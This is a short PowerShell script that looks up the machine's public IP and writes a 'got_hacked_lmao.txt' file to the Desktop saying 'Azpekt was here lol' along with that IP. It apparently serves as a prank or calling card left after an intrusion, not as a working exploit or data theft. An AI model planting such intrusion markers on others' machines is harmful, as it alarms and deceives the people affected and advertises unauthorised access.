$dir = [Environment]::GetFolderPath("Desktop")
$public_ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
New-Item -Path $dir -Name "got_hacked_lmao.txt" -Value "Azpekt was here lol `n"
Add-Content -Path $dir\got_hacked_lmao.txt -Value $public_ip